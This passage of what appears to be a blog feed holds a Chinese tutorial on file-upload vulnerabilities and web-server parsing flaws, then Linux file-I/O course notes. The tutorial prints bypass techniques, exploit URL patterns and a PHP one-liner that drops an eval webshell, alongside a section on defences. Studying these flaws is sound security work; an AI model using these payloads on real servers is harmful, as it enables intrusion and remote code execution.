<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：</p>
<pre class="line-numbers language-none"><code class="language-none">JPEG:FFD8FF
PNG:89504E47
GIF:47494638
TIFF:49492A00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过</strong></p>
<h3 id="文件扩展名检测"><a href="#文件扩展名检测" class="headerlink" title="文件扩展名检测"></a>文件扩展名检测</h3><p>这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。</p>
<p><strong>黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传 <code>.htaccess</code> 配置控制文件权限和::$DATA数据流的使用</strong></p>
<blockquote>
<p><code>.htaccess</code> 文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 <code>htaccess</code> 文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。</p>
<p><strong>白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及 <code>%00</code> ， <code>0x00</code> 截断绕过，这种场景针对save_path可控。</strong></p>
<p>00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加 <code>%00</code> ,或 <code>0x00</code> ，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。<code>%00</code> 和 <code>0x00</code> 的使用区别在于提交get请求时，是 <code>%00</code> ,会进行url自动解码动作，然后进入验证函数。<code>0x00</code> 则是post请求直接进入验证函数。</p>
<h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><p>比较厉害的防护检测，就是针对内容做检测，这种防护能力比较强，但也不是不能绕过。自始至终，攻防都是在对抗中螺旋演进的。</p>
<p>这种检测防护基本都是从webshell具有的代表性敏感字符?或者危险敏感函数。</p>
<p><strong>绕过思路：从特殊敏感字符开始进行Fuzz测试，探测webshell中有多少必要的字符存在被替换，如果构成webshell执行的字符</strong></p>
<p><strong>被替换得较多，剩下未过滤的字符的难以支撑webshell执行，可以换个角度利用系统，调用脚本语言，如<code>&lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;);&lt;script&gt;</code>。</strong></p>
<h1 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h1><h2 id="IIS-5-x-6-x-解析漏洞"><a href="#IIS-5-x-6-x-解析漏洞" class="headerlink" title="IIS 5.x/6.x 解析漏洞"></a>IIS 5.x/6.x 解析漏洞</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 </p>
<p><strong>IIS</strong>目前只适用于目<strong>Windows</strong>系统，不适用于其他操作系统。</p>
<h3 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h3><p><strong>当创建.asp的文件目录时，在此目录下的任意文件，服务器都解析为asp文件</strong></p>
<p>漏洞目录利用形式：<code>www.xxx.com/xx.asp/xx.jpg</code></p>
<p>xx.jpg的内容可以是一段合法的asp脚本文件</p>
<h3 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h3><p><strong>服务器默认不解析 <code>;</code> 以后的内容，导致 <code>xx.asp;.jpg</code> 解析成 <code>xx.asp</code> </strong></p>
<p>漏洞文件利用形式：<code>www.xxx.com/xx.asp;.jpg</code></p>
<p>xx.jpg的内容可以是一段合法的asp脚本文件</p>
<p>另外，IIS 6.x 除了会将扩展名为.asp的文件解析成asp之外，<strong>还会默认将扩展名为 <code>.asa</code> 、 <code>.cdx</code> 、<code>.cer</code> 解析成 <code>asp</code> </strong></p>
<h2 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h2><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。</p>
<h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><p>Apache的解析漏洞依赖于一个特性： <strong>Apache</strong>默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在默<strong>mime.types</strong>文件内），则继续向左识别，直到识别到合法后缀才进行解析。</p>
<p>漏洞形式：<code>www.xxx.com/1.php.aaa.bbb</code></p>
<p>实战中可以上传 <code>rar</code> ，<code>owf</code> 等文件进行利用，如果上传 <code>phpinfo.php.jpg</code> ，即使文件名中有 <code>.php</code> ，也会直接解析为jpg。因为Apache认识 <code>.jpg</code> ,停止继续向左识别。</p>
<h3 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h3><p>如果运维人员给 <code>.php</code> 后缀增加了处理器： </p>
<p><code>AddHandler application/x-httpd-php .php</code></p>
<p>那么，在有多个后缀的情况下，只要一个文件名中含有 <code>.php</code> 后缀，即被识别成PHP文件，没必要是最后一个后缀。 </p>
<p>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 </p>
<p>漏洞形式：<code>www.xxx.com/1.php.jpg</code></p>
<h3 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD  换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD  换行解析漏洞（CVE-2017-15715）</h3><p>影响范围：2.4.0~2.4.29版本</p>
<p>此漏洞形成的根本原因，在于<script type="math/tex">`, 正则表达式中 `</script> 不仅匹配字符串结尾位置，也可以匹配\n 或 \r </p>
<p>在解析PHP时，<code>1.php\x0A</code> 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h2 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h2><p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
<h3 id="配置文件错误导致的解析漏洞-cgi-fix-pathinfo"><a href="#配置文件错误导致的解析漏洞-cgi-fix-pathinfo" class="headerlink" title="配置文件错误导致的解析漏洞(cgi.fix_pathinfo)"></a>配置文件错误导致的解析漏洞(cgi.fix_pathinfo)</h3><p>对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。 </p>
<p>例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。 </p>
<p><strong>漏洞原理</strong></p>
<p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访 <code>www.xx.com/phpinfo.jpg/1.php</code> 这个URL时，<code>$fastcgi_script_name</code> 会被设置为“ <code>phpinfo.jpg/1.php</code> ”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?</p>
<p>这就要说到 <code>fix_pathinfo</code> 这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code><br>然后访问 <code>test.jpg/.php</code> ,在这个目录下就会生成一句话木马shell.php</p>
<p><strong>漏洞形式</strong></p>
<pre class="line-numbers language-none"><code class="language-none">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php
www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg%00.php
www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%200.php
xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="空字节任意代码执行漏洞"><a href="#空字节任意代码执行漏洞" class="headerlink" title="空字节任意代码执行漏洞"></a>空字节任意代码执行漏洞</h3><p>影响版本：<code>Nginx 0.5*, 0.6*,0.7 &lt;= 0.7.65,0.8 &lt;= 0.8.37</code></p>
<p>在nginx-0.7.65/html/目录下创建info.jpg,内容为 <code>&lt;?php phpinfo();?&gt;</code> , </p>
<p>访问info.jpg，并抓包，修改为 <code>info.jpg..php</code> ，在Hex选修卡中将jpg后面的 <code>.</code> ，更改为<code>00</code> </p>
<h1 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h1><h2 id="系统运行时的防御"><a href="#系统运行时的防御" class="headerlink" title="系统运行时的防御"></a>系统运行时的防御</h2><ol>
<li>文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</li>
<li>判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
<li>使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li>
<li>单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li>
<li>使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</li>
</ol>
<h2 id="系统开发阶段的防御"><a href="#系统开发阶段的防御" class="headerlink" title="系统开发阶段的防御"></a>系统开发阶段的防御</h2><ol>
<li>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。</li>
<li>对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</li>
</ol>
<h2 id="系统维护阶段的防御"><a href="#系统维护阶段的防御" class="headerlink" title="系统维护阶段的防御"></a>系统维护阶段的防御</h2><ol>
<li>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。</li>
<li>定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。</li>
<li>对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a href="https://www.jianshu.com/p/5ebba0482980">文件上传漏洞 学习笔记</a></p>
<p><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">Web安全-一句话木马</a></p>
<p><a href="https://www.cnblogs.com/TomDwan/p/14550984.html">文件上传漏洞全面渗透姿势总结</a></p>
<p><a href="https://blog.csdn.net/m0_38103658/article/details/100162185">文件上传漏洞攻击与防范方法</a></p>
<p>Web中间件常见漏洞总结</p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计（二）</title>
    <url>/2020/11/04/linux-cheng-xu-she-ji-er/</url>
    <content><![CDATA[<p>Linux课程笔记</p>
<p>对应PPT第3章：Working with Files</p>
<span id="more"></span>
<h1 id="Files-and-devices、System-calls、Library-functions"><a href="#Files-and-devices、System-calls、Library-functions" class="headerlink" title="Files and devices、System calls、Library functions"></a>Files and devices、System calls、Library functions</h1><h2 id="Linux-File-Structure"><a href="#Linux-File-Structure" class="headerlink" title="Linux File Structure"></a>Linux File Structure</h2><p>目录是一个文件，其中包含其他文件的索引节点编号和名称。<br>文件排列在目录中，该目录可能还包含子目录。 这些构成了熟悉的文件系统层次结构。</p>
<p>甚至硬件设备也经常由文件表示。<br>在UNIX和Linux中都可以找到的三个重要的设备文件是 <code>/dev/console</code>, <code>/dev/tty</code>, 和 <code>/dev/null</code> 。</p>
<blockquote>
<p>/dev/console这个设备代表的是控制台。错误信息和诊断信息通常会被发送到这个设备上。<br>/dev/tty如果一个进程有控制终端的话，那么特殊文件/dev/tty就是这个终端的的别名。<br>/dev/null这是空设备。所有写向这个设备的输出都将被丢弃。</p>
</blockquote>
<h2 id="System-Calls-and-Device-Drivers"><a href="#System-Calls-and-Device-Drivers" class="headerlink" title="System Calls and Device Drivers"></a>System Calls and Device Drivers</h2><p>我们可以使用少量的功能（称为系统调用）来访问和控制文件和设备。<br>操作系统的核心（内核）是许多设备驱动程序。 这些是用于控制系统硬件的低级接口的集合。<br>用于访问设备驱动程序的低级功能（系统调用）包括：</p>
<pre class="line-numbers language-none"><code class="language-none">open：打开文件或设备
read：从打开的文件或设备读取
write：写入文件或设备
close：关闭文件或设备
ioctl：将控制信息传递给设备驱动程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Library-Functions"><a href="#Library-Functions" class="headerlink" title="Library Functions"></a>Library Functions</h2><p>直接使用低级系统调用进行输入和输出的问题在于它们的效率很低。 为什么？</p>
<ol>
<li>进行系统调用会造成性能损失。</li>
<li>硬件具有局限性，可能会限制低级系统调用可以随时读取或写入的数据块的大小。</li>
</ol>
<p>为了向设备和磁盘文件提供更高级的接口，Linux发行版提供了许多标准库。</p>
<blockquote>
<p>系统调用会影响的性能。系统调用开销大，因为在执行系统调用时，Linux必须从用户代码切换到内核代码运行，然后在返回用户代码。减少这种开销的一个好办法是，在程序中尽量减少系统调用的次数，并且让每次系统调用完成尽可能多的工作。</p>
<p>硬件会对底层系统调用一次所能读写的数据块有一定的限制。例如，磁带机通常的写操作数据块长度是10k，所以如果所写的数据量不是10k的整数倍，磁带机还是会以10k为单位卷绕磁带，这就在磁带上留下了空隙。</p>
</blockquote>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnsAAAHZCAYAAAD+CP3vAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA6cAfpM6f8AALZ0SURBVHhe7d0HmGxV2eb9lxxERYICQ5I05DDkDCogSpCMoJKziGRByQgSBEQQRUFQUcmIOsIIo2SJggnHGVGifogkMYf9vb/lWefdFNXndB9Od1cV93Nd91Xdu/Zeaad/Pc8K//GPf/zj6H/9619RFEVRFEXRAOo/mgn2n/9EURRFURRFA6R//vOf/yqw9+tf/7o588wzm3322ado7733nvh3FEVRFEVR1D/Ccfvtt19zyCGHNEccccS/Ye+2225rFl100eY//uM/iqaZZpooiqIoiqKoT1WZ7j/1b9j73//7fzdzzz13+XKXXXZpjjnmmOawww5rDj300CiKoiiKoqhPdPjhhxeOw3Ozzz77y2Fvvvnma5ZaaqnmlltuaV588cXm8ccfbx577LEoiqIoiqKoT/TEE08Ujrv55pubVVZZpTvs3Xrrrc1LL73UPPnkkwX4oiiKoiiKov7QU089VTgO270C9v7bf/tvzX//7/+9+V//6381/9//9/81//f//t/m//yf/xNFURRFURT1if7f//t/heP+5//8n83/+B//I7AXRVEURVE0SArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAK7AXRVEURVE0wArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAK7AXRVEURVE0wArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAK7AXRVEURVE0wArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAK7AXRVEURVE0wArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAK7AXRVEURVE0wArsRVEURVEUDbACe1EURVEURQOswF4URVEURdEAq6dh7xe/+EXJUyGjKIp6SZ5NnlHdnl1RFEW9JM+snoS9n//8580vf/nL5je/+U3z9NNPl/yjKIp6QZ5JTz31VHlGeVZ1e4ZFURT1inoS9qpH74c//GFzww03NNdee20URVHP6LrrrivPxYceeqg8ROPhi6Kol9WTsPfII480TzzxRHP55Zc3b3/720s55p9//ma++eYrn1EURWMtz6H2M2iz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